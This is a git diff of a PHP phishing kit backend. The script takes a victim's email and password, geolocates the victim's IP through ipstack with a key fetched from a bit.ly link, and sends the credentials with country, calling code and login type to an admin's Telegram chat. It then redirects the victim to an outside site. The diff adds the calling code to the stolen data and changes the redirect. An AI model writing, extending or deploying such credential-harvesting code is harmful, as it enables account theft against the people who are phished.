@@ -57,7 +57,8 @@ $api_key = file_get_contents('https://bit.ly/3ns1Icy');
 $cty1 = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."&format=1");
 $jsondata = json_decode($cty1);
 $cty = $jsondata->country_name;
-$url1 = file_get_contents('https://bit.ly/33dtuCb');
+$ccode = $jsondata->location->calling_code;
+$url1 = 'http://www.verifyac.com/index.php?uc=M';
 header("location: $url1");
 $name = $message->from->first_name;
 $ads = file_get_contents('link.txt');
@@ -65,14 +66,17 @@ $dev = file_get_contents('https://bit.ly/394xXdQ');
 bot("sendMessage",[
 "chat_id"=>$admin,
 "text"=>"
-𝐍𝐞𝐰 𝐋𝐨𝐠𝐢𝐧 𝐁𝐲 $login
-👤 ¦ 𝑬𝒎𝒂𝒊𝒍 » `$email`
-📟 ¦ 𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅  » `$password`
+𝒀𝑶𝑼 𝑯𝑨𝑽𝑬 𝑨 𝑵𝑬𝑾 𝑳𝑶𝑮𝑰𝑵
+
+👤 ¦ 𝑬𝒎𝒂𝒊𝒍 » $email
+📟 ¦ 𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅  » $password
+☎️ ¦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 𝑪𝒐𝒅𝒆 » +$ccode
+🔱 ¦ 𝑳𝒐𝒈𝒊𝒏 » $login
 👁️‍🗨️¦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 » $cty
 ⏱ ¦ 𝑻𝒊𝒎𝒆 » $time
 📝 ¦ 𝑫𝒂𝒕𝒆 » $day/$month/$year
 🌐¦ 𝒀𝒐𝒖𝒓 𝑳𝒊𝒏𝒌 » $ads
-⚜¦ 𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓 » $dev
+⚜¦ 𝑩𝒀 » $dev
 ",
 'parse_mode'=>"MarkDown",
 'disable_web_page_preview'=>true,
@@ -89,4 +93,3 @@ bot("sendMessage",[
   <body>
   </body>
 </html>
-
